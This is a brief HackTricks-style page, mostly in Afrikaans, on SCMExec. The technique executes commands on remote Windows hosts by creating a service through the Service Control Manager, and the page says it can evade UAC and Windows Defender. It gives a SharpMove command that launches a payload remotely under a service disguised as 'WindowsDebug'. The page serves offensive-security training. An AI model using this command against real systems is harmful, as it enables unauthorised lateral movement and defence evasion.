# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** is ’n tegniek om opdragte op afgeleë stelsels uit te voer deur die Service Control Manager (SCM) te gebruik om ’n diens te skep wat die opdrag uitvoer. Hierdie metode kan sommige sekuriteitskontroles, soos User Account Control (UAC) en Windows Defender, omseil.

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):<sup>[[1]](#references)</sup>

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

## References

- [1] [SharpMove - GitHub repository](https://github.com/0xthirteen/SharpMove)

{{#include ../../banners/hacktricks-training.md}}
